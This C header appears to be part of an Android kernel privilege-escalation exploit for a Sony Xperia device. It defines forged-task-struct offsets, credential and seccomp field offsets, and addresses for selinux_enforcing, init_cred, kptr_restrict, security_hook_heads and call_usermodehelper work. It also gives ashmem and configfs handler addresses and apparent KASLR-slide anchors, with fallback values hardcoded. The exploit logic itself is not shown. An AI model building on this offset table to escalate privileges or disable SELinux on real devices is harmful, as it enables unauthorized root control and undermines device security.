#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "../devices/offsets.h"

extern const struct kernel_offsets *active_offsets;
extern uint64_t p0_kimage_text_base;

#define _RSO(field, fallback) (active_offsets && active_offsets->field ? active_offsets->field : (fallback))
#define _RSO_64(field, fallback) ((uint64_t)(active_offsets && active_offsets->field ? active_offsets->field : (fallback)))

#define _KIMAGE_TEXT_BASE_DEFAULT 0xffffffc080000000ULL
#undef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE p0_kimage_text_base

#undef SYSTEM_UNBOUND_WQ_OFF
#undef CALL_USERMODEHELPER_EXEC_WORK_OFF
#define SYSTEM_UNBOUND_WQ_OFF            _RSO_64(off_system_unbound_wq, 0)
#define CALL_USERMODEHELPER_EXEC_WORK_OFF _RSO_64(off_call_usermodehelper_exec_work, 0)

#undef FAKE_TASK_PRIO_OFF
#undef FAKE_TASK_NORMAL_PRIO_OFF
#undef FAKE_TASK_TASK_GROUP_OFF
#undef FAKE_TASK_PI_LOCK_OFF
#undef FAKE_TASK_PI_WAITERS_OFF
#undef FAKE_TASK_PI_TOP_TASK_OFF
#undef FAKE_TASK_PI_BLOCKED_ON_OFF
#undef MM_OWNER_OFF
#undef TASK_PID_OFF
#undef TASK_TGID_OFF
#undef TASK_REAL_PARENT_OFF
#undef TASK_ATOMIC_FLAGS_OFF
#undef TASK_REAL_CRED_OFF
#undef TASK_CRED_OFF
#undef TASK_COMM_OFF
#undef TASK_TASKS_OFF
#undef TASK_SECCOMP_OFF

#define FAKE_TASK_PRIO_OFF           _RSO(task_prio, 0x94)
#define FAKE_TASK_NORMAL_PRIO_OFF    _RSO(task_normal_prio, 0x9C)
#define FAKE_TASK_TASK_GROUP_OFF     _RSO(task_sched_task_group, 0x420)
#define FAKE_TASK_PI_LOCK_OFF        _RSO(task_pi_lock, 0x9EC)
#define FAKE_TASK_PI_WAITERS_OFF     _RSO(task_pi_waiters, 0xA00)
#define FAKE_TASK_PI_TOP_TASK_OFF    _RSO(task_pi_top_task, 0xA10)
#define FAKE_TASK_PI_BLOCKED_ON_OFF  _RSO(task_pi_blocked_on, 0xA18)
#define MM_OWNER_OFF             _RSO(mm_owner, 0x410)
#define TASK_PID_OFF             _RSO(task_pid, 0x708)
#define TASK_TGID_OFF            _RSO(task_tgid, 0x70C)
#define TASK_REAL_PARENT_OFF     _RSO(task_real_parent, 0x718)
#define TASK_ATOMIC_FLAGS_OFF    _RSO(task_atomic_flags, 0x6C8)
#define TASK_REAL_CRED_OFF       _RSO(task_real_cred, 0x8F8)
#define TASK_CRED_OFF            _RSO(task_cred, 0x900)
#define TASK_COMM_OFF            _RSO(task_comm, 0x910)
#define TASK_TASKS_OFF           _RSO(task_tasks, 0x638)
#define TASK_SECCOMP_OFF         _RSO(task_seccomp, 0x9C8)

/* file_operations struct field offsets.
 * 6.6 also shifts ioctl/compat_ioctl/mmap (lacks iterate_shared). */
#undef FOPS_LLSEEK_OFF
#undef FOPS_READ_OFF
#undef FOPS_WRITE_OFF
#undef FOPS_READ_ITER_OFF
#undef FOPS_WRITE_ITER_OFF
#undef FOPS_IOCTL_OFF
#undef FOPS_COMPAT_IOCTL_OFF
#undef FOPS_MMAP_OFF
#undef FOPS_OPEN_OFF
#undef FOPS_RELEASE_OFF
#undef FOPS_SPLICE_READ_OFF
#undef FOPS_SHOW_FDINFO_OFF

#define FOPS_LLSEEK_OFF       _RSO(fops_llseek, 0x10)
#define FOPS_READ_OFF         _RSO(fops_read, 0x18)
#define FOPS_WRITE_OFF        _RSO(fops_write, 0x20)
#define FOPS_READ_ITER_OFF    _RSO(fops_read_iter, 0x28)
#define FOPS_WRITE_ITER_OFF   _RSO(fops_write_iter, 0x30)
#define FOPS_IOCTL_OFF        _RSO(fops_ioctl, 0x50)
#define FOPS_COMPAT_IOCTL_OFF _RSO(fops_compat_ioctl, 0x58)
#define FOPS_MMAP_OFF         _RSO(fops_mmap, 0x60)
#define FOPS_OPEN_OFF         _RSO(fops_open, 0x68)
#define FOPS_RELEASE_OFF      _RSO(fops_release, 0x78)
#define FOPS_SPLICE_READ_OFF  _RSO(fops_splice_read, 0xb8)
#define FOPS_SHOW_FDINFO_OFF  _RSO(fops_show_fdinfo, 0xd8)

/* Symbol-address macros: entry-driven when available, Xperia-correct
 * target.h defaults otherwise. Without this, only main.c had entry-driven
 * builds of these macros and other translation units silently used
 * wrong-device addresses. */

/* statics must be defined BEFORE the #undefs below capture the fallbacks */
#define SELINUX_ENFORCING_OFF_STATIC  0x0225a448ULL
#define INIT_CRED_OFF_STATIC          0x020318e8ULL
#define INIT_TASK_OFF_STATIC          0x0201f440ULL
#define INIT_UTS_NS_OFF_STATIC        0x021a2db0ULL
#define EMPTY_ZERO_PAGE_OFF_STATIC    0x02201000ULL
#define ROOT_TASK_GROUP_OFF_STATIC    0x02208580ULL
#define KPTR_RESTRICT_OFF_STATIC      0x0201ce78ULL
#define SELINUX_BLOB_SIZES_OFF_STATIC 0x015d0a28ULL
#define SECURITY_HOOK_HEADS_OFF_STATIC 0x015d0318ULL
#define KMALLOC_CACHES_OFF_STATIC     0x015cfe58ULL
#define ANON_PIPE_BUF_OPS_OFF_STATIC  0x0110a110ULL
#define ASHMEM_MISC_FOPS_OFF_STATIC   0x0217cc70ULL
#define ASHMEM_FOPS_OFF_STATIC        0x01281910ULL
#define ASHMEM_IOCTL_OFF_STATIC       0x00c3cdf0ULL
#define ASHMEM_COMPAT_IOCTL_OFF_STATIC 0x00c3d728ULL
#define ASHMEM_MMAP_OFF_STATIC        0x00c3d780ULL
#define ASHMEM_OPEN_OFF_STATIC        0x00c3d9a0ULL
#define ASHMEM_RELEASE_OFF_STATIC     0x00c3da28ULL
#define ASHMEM_SHOW_FDINFO_OFF_STATIC 0x00c3db48ULL
#define CONFIGFS_READ_ITER_OFF_STATIC 0x00464f44ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF_STATIC 0x00465150ULL
#define COPY_SPLICE_READ_OFF_STATIC   0ULL
#define NOOP_LLSEEK_OFF_STATIC        0x00398e88ULL
#define SLIDE_NFULNL_LOGGER_OFF_STATIC 0x020127d0ULL
#define SLIDE_LOGGERS_0_1_OFF_STATIC  0x02012728ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF_STATIC 0x0227b4d8ULL
#define SLIDE_SYSCTL_BOOTID_OFF_STATIC 0x0227b4d8ULL

#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         _RSO_64(off_selinux_enforcing, SELINUX_ENFORCING_OFF_STATIC)
#define INIT_CRED_OFF                 _RSO_64(off_init_cred, INIT_CRED_OFF_STATIC)
#define INIT_TASK_OFF                 _RSO_64(off_init_task, INIT_TASK_OFF_STATIC)
#define INIT_UTS_NS_OFF               _RSO_64(off_init_uts_ns, INIT_UTS_NS_OFF_STATIC)
#define EMPTY_ZERO_PAGE_OFF           _RSO_64(off_empty_zero_page, EMPTY_ZERO_PAGE_OFF_STATIC)
#define ROOT_TASK_GROUP_OFF           _RSO_64(off_root_task_group, ROOT_TASK_GROUP_OFF_STATIC)
#define KPTR_RESTRICT_OFF             _RSO_64(off_kptr_restrict, KPTR_RESTRICT_OFF_STATIC)
#define SELINUX_BLOB_SIZES_OFF        _RSO_64(off_selinux_blob_sizes, SELINUX_BLOB_SIZES_OFF_STATIC)
#define SECURITY_HOOK_HEADS_OFF       _RSO_64(off_security_hook_heads, SECURITY_HOOK_HEADS_OFF_STATIC)
#define KMALLOC_CACHES_OFF            _RSO_64(off_kmalloc_caches, KMALLOC_CACHES_OFF_STATIC)
#define ANON_PIPE_BUF_OPS_OFF         _RSO_64(off_anon_pipe_buf_ops, ANON_PIPE_BUF_OPS_OFF_STATIC)
#define ASHMEM_MISC_FOPS_OFF          _RSO_64(off_ashmem_misc_fops, ASHMEM_MISC_FOPS_OFF_STATIC)
#define ASHMEM_FOPS_OFF               _RSO_64(off_ashmem_fops, ASHMEM_FOPS_OFF_STATIC)
#define ASHMEM_IOCTL_OFF              (uint64_t)_RSO(off_ashmem_ioctl, ASHMEM_IOCTL_OFF_STATIC)
#define ASHMEM_COMPAT_IOCTL_OFF       (uint64_t)_RSO(off_ashmem_compat_ioctl, ASHMEM_COMPAT_IOCTL_OFF_STATIC)
#define ASHMEM_MMAP_OFF               (uint64_t)_RSO(off_ashmem_mmap, ASHMEM_MMAP_OFF_STATIC)
#define ASHMEM_OPEN_OFF               (uint64_t)_RSO(off_ashmem_open, ASHMEM_OPEN_OFF_STATIC)
#define ASHMEM_RELEASE_OFF            (uint64_t)_RSO(off_ashmem_release, ASHMEM_RELEASE_OFF_STATIC)
#define ASHMEM_SHOW_FDINFO_OFF        (uint64_t)_RSO(off_ashmem_show_fdinfo, ASHMEM_SHOW_FDINFO_OFF_STATIC)
#define CONFIGFS_READ_ITER_OFF        _RSO_64(off_configfs_read_iter, CONFIGFS_READ_ITER_OFF_STATIC)
#define CONFIGFS_BIN_WRITE_ITER_OFF   _RSO_64(off_configfs_bin_write_iter, CONFIGFS_BIN_WRITE_ITER_OFF_STATIC)
#define COPY_SPLICE_READ_OFF          _RSO_64(off_copy_splice_read, COPY_SPLICE_READ_OFF_STATIC)
#define NOOP_LLSEEK_OFF               _RSO_64(off_noop_llseek, NOOP_LLSEEK_OFF_STATIC)
#define CAP_CAPABLE_ACTIVE_OFF        (uint64_t)(active_offsets ? active_offsets->off_cap_capable_active : 0)
#define SLIDE_NFULNL_LOGGER_OFF       _RSO_64(off_slide_nfulnl_logger, SLIDE_NFULNL_LOGGER_OFF_STATIC)
#define SLIDE_LOGGERS_0_1_OFF         _RSO_64(off_slide_loggers_0_1, SLIDE_LOGGERS_0_1_OFF_STATIC)
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF _RSO_64(off_slide_boot_id, SLIDE_RANDOM_BOOT_ID_DATA_OFF_STATIC)
#define SLIDE_SYSCTL_BOOTID_OFF       _RSO_64(off_slide_boot_id, SLIDE_SYSCTL_BOOTID_OFF_STATIC)

#endif
